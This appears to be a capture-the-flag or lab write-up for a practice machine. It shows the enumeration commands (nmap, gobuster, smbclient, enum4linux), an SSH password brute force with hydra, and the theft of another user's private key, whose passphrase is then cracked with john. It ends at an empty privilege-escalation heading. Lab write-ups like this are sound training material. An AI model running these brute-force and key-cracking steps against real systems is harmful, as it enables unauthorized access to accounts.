## Enumeration

Port scan with services

nmap -sC -sV 10.113.154.148 -oN initial.txt

Open services:

22 – SSH

80 – HTTP

139/445 – SMB

8080 – Tomcat

Web enumeration:

gobuster dir -u http://10.113.154.148 -w /usr/share/wordlists/dirb/common.txt

Found /development containing:

dev.txt

j.txt

## 2. SMB Enumeration

Check available shares:

smbclient -L //10.113.154.148/ -N

Enumerate users:

enum4linux -a 10.113.154.148

Discovered local users:

jan

kay

Anonymous share contained staff.txt, confirming jan as likely target.

## Initial Access – SSH Bruteforce

Used a reduced wordlist for efficiency:

head -n 5000 /usr/share/wordlists/rockyou.txt > small.txt
hydra -l jan -P small.txt ssh://10.113.154.148 -t 4

Credentials found:

jan : (redacted)

SSH login successful.

## Lateral Movement

As jan, inspected other home directories:

ls -la /home/kay

Found:

pass.bak

.ssh/id_rsa

## Cracking

Copied private key:

scp jan@10.113.154.148:/home/kay/.ssh/id_rsa .
chmod 600 id_rsa

Converted and cracked passphrase:

ssh2john id_rsa > keyhash.txt
john keyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Passphrase:

(redacted)

SSH login as kay:

ssh -i id_rsa kay@10.113.154.148

## Privilege Escalation
